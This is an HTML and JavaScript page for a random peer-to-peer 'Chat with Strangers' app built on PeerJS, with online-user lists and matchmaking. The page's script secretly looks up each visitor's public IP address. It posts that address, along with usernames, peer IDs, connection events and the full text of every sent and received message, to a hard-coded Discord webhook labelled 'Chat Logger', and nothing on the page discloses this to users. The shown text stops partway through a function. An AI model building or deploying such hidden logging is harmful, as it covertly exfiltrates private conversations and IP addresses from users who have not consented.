<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat with Strangers</title>
    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
        
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-tertiary: #1a1a1a;
            --text-primary: #e0e0e0;
            --text-secondary: #909090;
            --accent: #00ff9d;
            --accent-dark: #00cc7d;
            --accent-glow: rgba(0, 255, 157, 0.2);
            --danger: #ff3a4c;
            --success: #00ff9d;
            --warning: #ffbb00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        header {
            background-color: var(--bg-secondary);
            padding: 1rem;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        
        header h1 {
            color: var(--accent);
            font-weight: 600;
            letter-spacing: 1px;
        }
        
        .container {
            flex: 1;
            max-width: 800px;
            margin: 0 auto;
            padding: 1rem;
            width: 100%;
            display: flex;
            flex-direction: column;
        }
        
        #setup-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        #setup-screen h2 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
            font-weight: 600;
        }
        
        #my-id-display {
            padding: 1rem;
            background-color: var(--bg-tertiary);
            border-radius: 8px;
            margin-bottom: 1rem;
            word-break: break-all;
            border: 1px solid #222;
        }
        
        #my-id {
            color: var(--accent);
            font-weight: bold;
            font-family: monospace;
        }
        
        #connect-form {
            display: flex;
            flex-direction: column;
            gap: 0.8rem;
            width: 100%;
            max-width: 400px;
        }
        
        #connect-form h3 {
            color: var(--text-primary);
            font-weight: 600;
            font-size: 1.2rem;
        }
        
        #peer-id-input {
            padding: 0.8rem 1rem;
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid #222;
            border-radius: 4px;
            font-size: 1rem;
        }
        
        #peer-id-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px var(--accent-glow);
        }
        
        #chat-screen {
            display: flex;
            flex-direction: column;
            flex: 1;
        }
        
        #connection-status {
            padding: 1rem;
            background-color: var(--bg-tertiary);
            margin-bottom: 1rem;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #222;
        }
        
        #messages {
            flex: 1;
            overflow-y: auto;
            padding: 1rem;
            display: flex;
            flex-direction: column;
            gap: 0.8rem;
            background-color: var(--bg-tertiary);
            border-radius: 8px;
            margin-bottom: 1rem;
            min-height: 300px;
            max-height: 60vh;
            border: 1px solid #222;
        }
        
        #messages::-webkit-scrollbar {
            width: 6px;
        }
        
        #messages::-webkit-scrollbar-thumb {
            background-color: var(--accent-dark);
            border-radius: 6px;
        }
        
        #messages::-webkit-scrollbar-track {
            background-color: var(--bg-secondary);
            border-radius: 6px;
        }
        
        .message {
            padding: 0.8rem 1rem;
            border-radius: 8px;
            max-width: 80%;
            word-break: break-word;
            line-height: 1.4;
        }
        
        .message.sent {
            background-color: var(--accent-dark);
            align-self: flex-end;
            color: #000;
            font-weight: 500;
        }
        
        .message.received {
            background-color: #222;
            align-self: flex-start;
        }
        
        .username {
            font-size: 0.8rem;
            opacity: 0.8;
            margin-bottom: 0.2rem;
            font-weight: 600;
        }
        
        #message-form {
            display: flex;
            gap: 0.5rem;
        }
        
        input, button {
            padding: 0.8rem 1rem;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
        }
        
        #message-input {
            flex: 1;
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid #222;
        }
        
        #message-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px var(--accent-glow);
        }
        
        button {
            background-color: var(--accent);
            color: #000;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.2s;
        }
        
        button:hover {
            background-color: var(--accent-dark);
        }
        
        button:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
        }
        
        #disconnect-btn {
            background-color: var(--danger);
            color: white;
            margin-top: 1rem;
        }
        
        #disconnect-btn:hover {
            background-color: #e6293a;
        }
        
        footer {
            text-align: center;
            padding: 1rem;
            background-color: var(--bg-secondary);
            color: var(--text-secondary);
            font-size: 0.8rem;
            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
        }
        
        .status-connecting {
            color: var(--warning);
        }
        
        .status-connected {
            color: var(--success);
        }
        
        .status-disconnected {
            color: var(--danger);
        }
        
        #error-display {
            color: var(--danger);
            padding: 1rem;
            margin-top: 1rem;
            background-color: rgba(255, 58, 76, 0.1);
            border-radius: 4px;
            text-align: center;
            display: none;
            border: 1px solid rgba(255, 58, 76, 0.3);
        }
        
        #debug-log {
            background-color: #0a0a0a;
            color: var(--accent);
            padding: 0.8rem;
            font-family: monospace;
            height: 100px;
            overflow-y: auto;
            margin-top: 1rem;
            font-size: 0.8rem;
            white-space: pre-wrap;
            border-radius: 4px;
            border: 1px solid #222;
        }
        
        #online-users-panel {
            background-color: var(--bg-tertiary);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            border: 1px solid #222;
            width: 100%;
        }
        
        #online-users-panel h3 {
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        #online-count {
            background-color: var(--accent);
            color: #000;
            border-radius: 12px;
            padding: 0.2rem 0.6rem;
            font-size: 0.8rem;
            font-weight: bold;
        }
        
        #users-list {
            max-height: 200px;
            overflow-y: auto;
            background-color: rgba(0, 0, 0, 0.2);
            border-radius: 4px;
        }
        
        #users-list::-webkit-scrollbar {
            width: 6px;
        }
        
        #users-list::-webkit-scrollbar-thumb {
            background-color: var(--accent-dark);
            border-radius: 6px;
        }
        
        #users-list::-webkit-scrollbar-track {
            background-color: var(--bg-secondary);
            border-radius: 6px;
        }
        
        .user-item {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem;
            border-bottom: 1px solid #222;
        }
        
        .user-item:last-child {
            border-bottom: none;
        }
        
        .user-item .user-name {
            font-weight: bold;
            display: flex;
            align-items: center;
        }
        
        .user-item .user-name::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background-color: var(--success);
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .user-item .user-id {
            color: var(--text-secondary);
            font-size: 0.8rem;
            font-family: monospace;
        }
        
        .user-item.current-user {
            background-color: rgba(0, 255, 157, 0.1);
        }
        
        .connect-icon {
            cursor: pointer;
            color: var(--accent);
            margin-left: 0.5rem;
        }
        
        #random-chat-wrapper {
            margin-bottom: 1.5rem;
            width: 100%;
            max-width: 400px;
        }
        
        #random-chat-btn {
            width: 100%;
            background-color: var(--warning);
            color: #000;
            font-size: 1.1rem;
            padding: 1rem;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: transform 0.2s, background-color 0.2s;
        }
        
        #random-chat-btn:hover {
            background-color: #e6a800;
            transform: translateY(-2px);
        }
        
        #random-chat-btn:active {
            transform: translateY(0);
        }
        
        #random-chat-btn:disabled {
            background-color: #665000;
            transform: none;
        }
        
        #random-chat-btn .icon {
            font-size: 1.2rem;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .random-connecting {
            animation: pulse 1s infinite;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        #setup-screen, #chat-screen {
            animation: fadeIn 0.5s ease-out;
        }
        
        #searching-indicator {
            margin-top: 0.5rem;
            font-size: 0.9rem;
            color: var(--accent);
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <h1>Chat with Strangers</h1>
    </header>
    
    <div class="container">
        <div id="setup-screen">
            <h2>Find Someone to Chat With</h2>
            
            <div id="random-chat-wrapper">
                <button id="random-chat-btn">
                    <span class="icon">ðŸŽ²</span>
                    Start Random Chat
                </button>
                <div id="searching-indicator">Searching for someone to chat with...</div>
            </div>
            
            <div id="online-users-panel">
                <h3>
                    Online Users
                    <span id="online-count">0</span>
                </h3>
                <div id="users-list">
                    <div class="user-item">
                        <div>
                            <span class="user-name">Loading users...</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="my-id-display">
                <p>Your ID: <span id="my-id">Connecting...</span></p>
                <p>Share this ID with someone you want to chat with.</p>
            </div>
            
            <form id="connect-form">
                <h3>Connect to someone</h3>
                <input type="text" id="peer-id-input" placeholder="Enter their ID here...">
                <button type="submit" id="connect-btn">Connect</button>
            </form>
            
            <div id="error-display"></div>
        </div>
        
        <div id="chat-screen">
            <div id="connection-status">
                <p id="status-text" class="status-disconnected">Disconnected</p>
                <p id="username-display"></p>
            </div>
            
            <div id="messages"></div>
            
            <form id="message-form">
                <input type="text" id="message-input" placeholder="Type your message..." autocomplete="off" disabled>
                <button type="submit" id="send-btn" disabled>Send</button>
            </form>
            
            <button id="disconnect-btn">Disconnect</button>
        </div>
        
        <div id="debug-log"></div>
    </div>
    
    <footer>
        <p>Chat with Strangers &copy; 2025</p>
    </footer>

    <script>
        // Discord webhook URL - replace with your actual webhook URL
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367405276898263160/KBpTkpTtSbz9oRJefUrbiSIV7aOp1f7nE5qP_aThs3_D86Rm1Emk48ojUxQwYpnrDoIN';
        
        const setupScreen = document.getElementById('setup-screen');
        const chatScreen = document.getElementById('chat-screen');
        const myIdDisplay = document.getElementById('my-id');
        const peerIdInput = document.getElementById('peer-id-input');
        const connectForm = document.getElementById('connect-form');
        const connectBtn = document.getElementById('connect-btn');
        const disconnectBtn = document.getElementById('disconnect-btn');
        const statusText = document.getElementById('status-text');
        const usernameDisplay = document.getElementById('username-display');
        const messagesContainer = document.getElementById('messages');
        const messageForm = document.getElementById('message-form');
        const messageInput = document.getElementById('message-input');
        const sendBtn = document.getElementById('send-btn');
        const errorDisplay = document.getElementById('error-display');
        const debugLog = document.getElementById('debug-log');
        const onlineCount = document.getElementById('online-count');
        const usersList = document.getElementById('users-list');
        const randomChatBtn = document.getElementById('random-chat-btn');
        const searchingIndicator = document.getElementById('searching-indicator');
        
        chatScreen.style.display = 'none';
        
        let peer;
        let connection;
        let localUsername;
        let remoteUsername;
        let isConnected = false;
        let myPeerId;
        let isSearching = false;
        let userIP = 'Unknown';
        
        let trackerConnection;
        const TRACKER_SERVER_ID = 'user-tracker-server';
        let onlineUsers = new Map();
        let searchingUsers = new Map();
        let heartbeatInterval;
        let matchmakingInterval;
        let onlineCheckInterval;
        let visibilityChangeHandler;
        
        // Function to get user's IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unknown';
            }
        }
        
        // Function to send data to Discord webhook
        async function sendToDiscordWebhook(content) {
            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
                console.warn('Discord webhook URL not configured');
                return;
            }
            
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: content,
                        username: 'Chat Logger',
                        avatar_url: 'https://i.imgur.com/4M34hi2.png',
                    }),
                });
                
                if (!response.ok) {
                    console.error('Failed to send to Discord webhook:', response.status);
                }
            } catch (error) {
                console.error('Error sending to Discord webhook:', error);
            }
        }
        
        function log(message) {
            console.log(message);
            const now = new Date().toLocaleTimeString();
            debugLog.innerHTML += `[${now}] ${message}\n`;
            debugLog.scrollTop = debugLog.scrollHeight;
        }
        
        function showError(message) {
            errorDisplay.textContent = message;
            errorDisplay.style.display = 'block';
            setTimeout(() => {
                errorDisplay.style.display = 'none';
            }, 5000);
        }
        
        function generateUsername() {
            const adjectives = ['Happy', 'Clever', 'Brave', 'Witty', 'Gentle', 'Bold', 'Calm', 'Eager', 'Fair', 'Kind'];
            const nouns = ['Wolf', 'Bear', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Fox', 'Owl', 'Dolphin', 'Panther'];
            const randomNumber = Math.floor(Math.random() * 1000);
            const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
            const noun = nouns[Math.floor(Math.random() * nouns.length)];
            return `${adj}${noun}${randomNumber}`;
        }
        
        function generateSimpleId() {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < 6; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
        
        function updateOnlineUsersUI() {
            onlineCount.textContent = onlineUsers.size;
            
            usersList.innerHTML = '';
            
            onlineUsers.forEach((userData, peerId) => {
                const userItem = document.createElement('div');
                userItem.classList.add('user-item');
                
                if (peerId === myPeerId) {
                    userItem.classList.add('current-user');
                }
                
                const userInfo = document.createElement('div');
                
                const userName = document.createElement('span');
                userName.classList.add('user-name');
                userName.textContent = userData.username;
                
                // Add searching indicator if user is searching
                if (userData.searching) {
                    const searchingBadge = document.createElement('span');
                    searchingBadge.textContent = ' ðŸ”';
                    searchingBadge.style.fontSize = '0.8em';
                    searchingBadge.style.opacity = '0.7';
                    userName.appendChild(searchingBadge);
                }
                
                const userId = document.createElement('span');
                userId.classList.add('user-id');
                userId.textContent = ` (${peerId})`;
                
                userInfo.appendChild(userName);
                userInfo.appendChild(userId);
                userItem.appendChild(userInfo);
                
                if (peerId !== myPeerId && !isConnected) {
                    const connectIcon = document.createElement('span');
                    connectIcon.classList.add('connect-icon');
                    connectIcon.textContent = 'â†’ Connect';
                    connectIcon.onclick = () => {
                        peerIdInput.value = peerId;
                        connectToPeer(peerId);
                    };
                    userItem.appendChild(connectIcon);
                }
                
                usersList.appendChild(userItem);
            });
            
            updateRandomChatButton();
        }
        
        // Function to check if users are still online
        function checkOnlineUsers() {
            if (!trackerConnection || !trackerConnection.open) return;
            
            log('Checking online users status...');
            
            // Send a ping to the tracker to verify online users
            trackerConnection.send({
                type: 'ping',
                peerId: myPeerId,
                timestamp: Date.now()
            });
        }
        
        // Function to handle visibility change
        function setupVisibilityChangeHandler() {
            let hidden, visibilityChange;
            
            if (typeof document.hidden !== "undefined") {
                hidden = "hidden";
                visibilityChange = "visibilitychange";
            } else if (typeof document.msHidden !== "undefined") {
                hidden = "msHidden";
                visibilityChange = "msvisibilitychange";
            } else if (typeof document.webkitHidden !== "undefined") {
                hidden = "webkitHidden";
                visibilityChange = "webkitvisibilitychange";
            }
            
            visibilityChangeHandler = function() {
                if (document[hidden]) {
                    // Tab is inactive, stop checking online users
                    if (onlineCheckInterval) {
                        clearInterval(onlineCheckInterval);
                        onlineCheckInterval = null;
                        log('Tab inactive - stopped online user checks');
                    }
                } else {
                    // Tab is active, start checking online users
                    if (!onlineCheckInterval) {
                        onlineCheckInterval = setInterval(checkOnlineUsers, 5000);
                        log('Tab active - started online user checks');
                        // Do an immediate check
                        checkOnlineUsers();
                    }
                }
            };
            
            // Handle page visibility change
            document.addEventListener(visibilityChange, visibilityChangeHandler, false);
            
            // Initial setup based on current visibility
            if (document[hidden]) {
                visibilityChangeHandler();
            } else {
                onlineCheckInterval = setInterval(checkOnlineUsers, 5000);
                log('Initialized online user checks');
            }
        }
        
        async function initializePeer() {
            const peerId = generateSimpleId();
            localUsername = generateUsername();
            userIP = await getUserIP();
            
            // Send join notification to Discord
            sendToDiscordWebhook(`ðŸŒ **User Joined**\n- Username: ${localUsername}\n- Peer ID: ${peerId}\n- IP: ${userIP}\n- Time: ${new Date().toLocaleString()}`);
            
            log(`Initializing PeerJS with ID: ${peerId}`);
            
            try {
                peer = new Peer(peerId, {
                    debug: 2
                });
                
                peer.on('open', (id) => {
                    log(`Peer connected with ID: ${id}`);
                    myPeerId = id;
                    myIdDisplay.textContent = id;
                    usernameDisplay.textContent = `Your username: ${localUsername}`;
                    
                    onlineUsers.set(id, {
                        username: localUsername,
                        searching: false
                    });
                    updateOnlineUsersUI();
                    
                    connectToTracker();
                    
                    // Set up online user checks when tab is active
                    setupVisibilityChangeHandler();
                });
                
                peer.on('connection', (conn) => {
                    log(`Incoming connection from: ${conn.peer}`);
                    
                    if (conn.peer === TRACKER_SERVER_ID) {
                        log('Tracker server initiated connection');
                        trackerConnection = conn;
                        setupTrackerConnection();
                        return;
                    }
                    
                    if (!isConnected) {
                        connection = conn;
                        setupConnection();
                    } else {
                        conn.close();
                    }
                });
                
                peer.on('error', (err) => {
                    log(`Peer error: ${err.type}`);
                    
                    if (err.type === 'peer-unavailable' && err.message.includes(TRACKER_SERVER_ID)) {
                        log('Tracker server not found, becoming tracker server');
                        becomeTrackerServer();
                        return;
                    }
                    
                    showError(`Connection error: ${err.type}`);
                    
                    if (err.type === 'peer-unavailable') {
                        showError('Peer ID not found. Check the ID and try again.');
                    } else if (err.type === 'network') {
                        showError('Network error. Check your internet connection.');
                    } else if (err.type === 'disconnected') {
                        showError('Disconnected from server. Try refreshing the page.');
                    }
                });
                
                peer.on('disconnected', () => {
                    log('Peer disconnected from server');
                    showError('Disconnected from server. Click to reconnect.');
                    
                    setTimeout(() => {
                        if (peer) peer.reconnect();
                    }, 3000);
                });
            } catch (error) {
                log(`Error initializing PeerJS: ${error.message}`);
                showError(`Failed to initialize connection: ${error.message}`);
            }
        }
        
        function connectToTracker() {
            log('Attempting to connect to tracker server');
            
            try {
                trackerConnection = peer.connect(TRACKER_SERVER_ID, {
                    reliable: true
                });
                
                setupTrackerConnection();
            } catch (error) {
                log(`Error connecting to tracker: ${error.message}`);
            }
        }
        
        function setupTrackerConnection() {
            log('Setting up tracker connection');
            
            trackerConnection.on('open', () => {
                log('Connected to tracker server');
                
                trackerConnection.send({
                    type: 'register',
                    peerId: myPeerId,
                    username: localUsername,
                    searching: isSearching
                });
                
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                heartbeatInterval = setInterval(() => {
                    if (trackerConnection && trackerConnection.open) {
                        trackerConnection.send({
                            type: 'heartbeat',
                            peerId: myPeerId,
                            username: localUsername,
                            searching: isSearching
                        });
                    }
                }, 30000);
                
                if (isSearching && !matchmakingInterval) {
                    startMatchmaking();
                }
            });
            
            trackerConnection.on('data', (data) => {
                log(`Received tracker data: ${JSON.stringify(data)}`);
                
                if (data.type === 'userList') {
                    onlineUsers = new Map(Object.entries(data.users));
                    updateOnlineUsersUI();
                } else if (data.type === 'matchFound' && isSearching) {
                    // A match has been found for us
                    stopSearching();
                    connectToPeer(data.matchPeerId);
                } else if (data.type === 'userOffline') {
                    // A user has gone offline
                    if (onlineUsers.has(data.peerId)) {
                        onlineUsers.delete(data.peerId);
                        updateOnlineUsersUI();
                        log(`User ${data.peerId} marked as offline`);
                    }
                }
            });
            
            trackerConnection.on('close', () => {
                log('Tracker connection closed');
                
                if (heartbeatInterval) {
                    clearInterval(heartbeatInterval);
                    heartbeatInterval = null;
                }
                
                if (matchmakingInterval) {
                    clearInterval(matchmakingInterval);
                    matchmakingInterval = null;
                }
                
                if (onlineCheckInterval) {
                    clearInterval(onlineCheckInterval);
                    onlineCheckInterval = null;
                }
                
                setTimeout(() => {
                    connectToTracker();
                }, 5000);
            });
            
            trackerConnection.on('error', (error) => {
                log(`Tracker connection error: ${error}`);
                
                setTimeout(() => {
                    connectToTracker();
                }, 5000);
            });
        }

        function becomeTrackerServer() {
            log('Becoming tracker server');
            
            try {
                const trackerServer = new Peer(TRACKER_SERVER_ID, {
                    debug: 2
                });
                
                const connectedUsers = new Map();
                connectedUsers.set(myPeerId, {
                    username: localUsername,
                    searching: false
                });
                
                const userConnections = new Map();
                
                trackerServer.on('open', (id) => {
                    log(`Tracker server started with ID: ${id}`);
                    
                    const trackerStatus = document.createElement('div');
                    trackerStatus.textContent = 'ðŸ”„ Tracking server active';
                    trackerStatus.style.color = 'var(--accent)';
                    trackerStatus.style.marginTop = '0.5rem';
                    document.querySelector('#my-id-display').appendChild(trackerStatus);
                    
                    // Start checking for inactive users
                    const inactiveCheckInterval = setInterval(() => {
                        const now = Date.now();
                        const inactiveThreshold = 15000; // 15 seconds
                        let changed = false;
                        
                        userConnections.forEach((conn, peerId) => {
                            if (now - conn.lastActivity > inactiveThreshold) {
                                log(`User ${peerId} inactive, removing`);
                                userConnections.delete(peerId);
                                connectedUsers.delete(peerId);
                                changed = true;
                            }
                        });
                        
                        if (changed) {
                            broadcastUserList();
                        }
                    }, 5000);
                    
                    // Clean up interval when server is destroyed
                    trackerServer.on('close', () => {
                        clearInterval(inactiveCheckInterval);
                    });
                });
                
                trackerServer.on('connection', (conn) => {
                    log(`Tracker: New connection from ${conn.peer}`);
                    
                    conn.lastActivity = Date.now();
                    userConnections.set(conn.peer, conn);
                    
                    conn.on('open', () => {
                        log(`Tracker: Connection to ${conn.peer} opened`);
                        
                        conn.send({
                            type: 'userList',
                            users: Object.fromEntries(connectedUsers)
                        });
                    });
                    
                    conn.on('data', (data) => {
                        log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
                        
                        if (data.type === 'register' || data.type === 'heartbeat' || data.type === 'ping') {
                            // Update last activity time
                            conn.lastActivity = Date.now();
                            
                            connectedUsers.set(data.peerId, {
                                username: data.username,
                                searching: data.searching || false
                            });
                            
                            // If this user is searching, try to match them
                            if (data.searching) {
                                tryToMatchUsers(data.peerId, connectedUsers);
                            }
                            
                            broadcastUserList();
                        }
                    });
                    
                    conn.on('close', () => {
                        log(`Tracker: Connection to ${conn.peer} closed`);
                        
                        connectedUsers.delete(conn.peer);
                        userConnections.delete(conn.peer);
                        
                        broadcastUserList();
                    });
                    
                    conn.on('error', (error) => {
                        log(`Tracker: Error with connection to ${conn.peer}: ${error}`);
                        
                        connectedUsers.delete(conn.peer);
                        userConnections.delete(conn.peer);
                        
                        broadcastUserList();
                    });
                });
                
                function tryToMatchUsers(newSearchingPeerId, users) {
                    // Find another searching user who isn't the new one
                    const searchingUsers = Array.from(users.entries())
                        .filter(([peerId, userData]) => 
                            userData.searching && 
                            peerId !== newSearchingPeerId && 
                            peerId !== TRACKER_SERVER_ID
                        );
                    
                    if (searchingUsers.length > 0) {
                        // Match with the first available searching user
                        const [matchPeerId, matchUserData] = searchingUsers[0];
                        
                        // Update both users to no longer be searching
                        users.set(newSearchingPeerId, {
                            ...users.get(newSearchingPeerId),
                            searching: false
                        });
                        
                        users.set(matchPeerId, {
                            ...users.get(matchPeerId),
                            searching: false
                        });
                        
                        // Notify both users
                        const newUserConn = userConnections.get(newSearchingPeerId);
                        const matchUserConn = userConnections.get(matchPeerId);
                        
                        if (newUserConn && newUserConn.open) {
                            newUserConn.send({
                                type: 'matchFound',
                                matchPeerId: matchPeerId
                            });
                        }
                        
                        if (matchUserConn && matchUserConn.open) {
                            matchUserConn.send({
                                type: 'matchFound',
                                matchPeerId: newSearchingPeerId
                            });
                        }
                        
                        broadcastUserList();
                    }
                }
                
                function broadcastUserList() {
                    const userListMessage = {
                        type: 'userList',
                        users: Object.fromEntries(connectedUsers)
                    };
                    
                    onlineUsers = new Map(connectedUsers);
                    updateOnlineUsersUI();
                    
                    userConnections.forEach((conn, peerId) => {
                        if (conn.open) {
                            conn.send(userListMessage);
                        } else {
                            userConnections.delete(peerId);
                            connectedUsers.delete(peerId);
                        }
                    });
                }
                
                const cleanupInterval = setInterval(() => {
                    let changed = false;
                    
                    userConnections.forEach((conn, peerId) => {
                        if (!conn.open) {
                            userConnections.delete(peerId);
                            connectedUsers.delete(peerId);
                            changed = true;
                        }
                    });
                    
                    if (changed) {
                        broadcastUserList();
                    }
                }, 60000);
                
                window.addEventListener('beforeunload', () => {
                    clearInterval(cleanupInterval);
                    trackerServer.destroy();
                });
                
            } catch (error) {
                log(`Error becoming tracker server: ${error.message}`);
                
                setTimeout(() => {
                    connectToTracker();
                }, 5000);
            }
        }
        
        function startMatchmaking() {
            if (!matchmakingInterval) {
                matchmakingInterval = setInterval(() => {
                    if (trackerConnection && trackerConnection.open) {
                        trackerConnection.send({
                            type: 'heartbeat',
                            peerId: myPeerId,
                            username: localUsername,
                            searching: isSearching
                        });
                    }
                }, 5000);
            }
        }
        
        function stopMatchmaking() {
            if (matchmakingInterval) {
                clearInterval(matchmakingInterval);
                matchmakingInterval = null;
            }
        }
        
        function startSearching() {
            if (isSearching || isConnected) return;
            
            isSearching = true;
            searchingIndicator.style.display = 'block';
            randomChatBtn.disabled = true;
            randomChatBtn.textContent = 'Searching...';
            
            // Update our status with the tracker
            if (trackerConnection && trackerConnection.open) {
                trackerConnection.send({
                    type: 'heartbeat',
                    peerId: myPeerId,
                    username: localUsername,
                    searching: true
                });
                
                // Also update our local representation
                if (onlineUsers.has(myPeerId)) {
                    onlineUsers.set(myPeerId, {
                        username: localUsername,
                        searching: true
                    });
                    updateOnlineUsersUI();
                }
                
                startMatchmaking();
            }
        }
        
        function stopSearching() {
            if (!isSearching) return;
            
            isSearching = false;
            searchingIndicator.style.display = 'none';
            randomChatBtn.disabled = false;
            randomChatBtn.innerHTML = '<span class="icon">ðŸŽ²</span> Start Random Chat';
            
            // Update our status with the tracker
            if (trackerConnection && trackerConnection.open) {
                trackerConnection.send({
                    type: 'heartbeat',
                    peerId: myPeerId,
                    username: localUsername,
                    searching: false
                });
                
                // Also update our local representation
                if (onlineUsers.has(myPeerId)) {
                    onlineUsers.set(myPeerId, {
                        username: localUsername,
                        searching: false
                    });
                    updateOnlineUsersUI();
                }
                
                stopMatchmaking();
            }
        }
        
        function connectToPeer(peerId) {
            if (isConnected) return;
            
            log(`Connecting to peer: ${peerId}`);
            statusText.textContent = 'Connecting...';
            statusText.className = 'status-connecting';
            
            // Stop searching if we were
            stopSearching();
            
            try {
                connection = peer.connect(peerId, {
                    reliable: true
                });
                setupConnection();
            } catch (error) {
                log(`Error connecting to peer: ${error.message}`);
                showError(`Failed to connect: ${error.message}`);
                statusText.textContent = 'Disconnected';
                statusText.className = 'status-disconnected';
            }
        }
        
        function setupConnection() {
            connection.on('open', () => {
                log(`Connection established with: ${connection.peer}`);
                isConnected = true;
                
                // Send connection notification to Discord
                sendToDiscordWebhook(`ðŸ”— **New Connection**\n- From: ${localUsername} (${myPeerId}, IP: ${userIP})\n- To: ${connection.peer}\n- Time: ${new Date().toLocaleString()}`);
                
                connection.send({
                    type: 'username',
                    username: localUsername
                });
                
                setupScreen.style.display = 'none';
                chatScreen.style.display = 'flex';
                statusText.textContent = 'Connected';
                statusText.className = 'status-connected';
                messageInput.disabled = false;
                sendBtn.disabled = false;
                
                appendSystemMessage('Connected! Say hello!');
            });
            
            connection.on('data', (data) => {
                log(`Received data: ${JSON.stringify(data)}`);
                
                if (data.type === 'message') {
                    // Send message notification to Discord
                    sendToDiscordWebhook(`ðŸ“© **Message Sent**\n- From: ${remoteUsername || 'Unknown'} (${connection.peer})\n- To: ${localUsername} (${myPeerId}, IP: ${userIP})\n- Message: ${data.message}\n- Time: ${new Date().toLocaleString()}`);
                    
                    appendMessage(data.message, false, remoteUsername || 'Stranger');
                } else if (data.type === 'username') {
                    remoteUsername = data.username;
                    usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
                    appendSystemMessage(`You're chatting with ${remoteUsername}`);
                }
            });
            
            connection.on('close', () => {
                log('Connection closed');
                // Send disconnection notification to Discord
                sendToDiscordWebhook(`ðŸ”Œ **Disconnected**\n- User: ${localUsername} (${myPeerId}, IP: ${userIP})\n- From chat with: ${remoteUsername || 'Unknown'} (${connection?.peer || 'Unknown'})\n- Time: ${new Date().toLocaleString()}`);
                handleDisconnect();
            });
            
            connection.on('error', (err) => {
                log(`Connection error: ${err}`);
                showError(`Connection error: ${err}`);
                handleDisconnect();
            });
        }
        
        function disconnectFromPeer() {
            if (connection) {
                connection.close();
            }
            handleDisconnect();
        }
        
        function handleDisconnect() {
            isConnected = false;
            
            setupScreen.style.display = 'flex';
            chatScreen.style.display = 'none';
            statusText.textContent = 'Disconnected';
            statusText.className = 'status-disconnected';
            messageInput.disabled = true;
            sendBtn.disabled = true;
            
            messagesContainer.innerHTML = '';
            
            stopSearching();
            updateRandomChatButton();
        }
        
        function appendMessage(text, isSent, sender) {
            const messageElement = document.createElement('div');
            messageElement.classList.add('message');
            messageElement.classList.add(isSent ? 'sent' : 'received');
            
            const usernameElement = document.createElement('div');
            usernameElement.classList.add('username');
            usernameElement.textContent = sender;
            
            const textElement = document.createElement('div');
            textElement.textContent = text;
            
            messageElement.appendChild(usernameElement);
            messageElement.appendChild(textElement);
            
            messagesContainer.appendChild(messageElement);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
            // If message is sent, log it to Discord
            if (isSent) {
                sendToDiscordWebhook(`ðŸ“¤ **Message Sent**\n- From: ${localUsername} (${myPeerId}, IP: ${userIP})\n- To: ${remoteUsername || 'Unknown'} (${connection?.peer || 'Unknown'})\n- Message: ${text}\n- Time: ${new Date().toLocaleString()}`);
            }
        }
        
        function appendSystemMessage(text) {
            const messageElement = document.createElement('div');
            messageElement.classList.add('message');
            messageElement.style.alignSelf = 'center';
            messageElement.style.backgroundColor = '#333';
            messageElement.style.color = '#aaa';
            messageElement.style.fontStyle = 'italic';
            messageElement.textContent = text;
            
            messagesContainer.appendChild(messageElement);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }
        
        function updateRandomChatButton() {
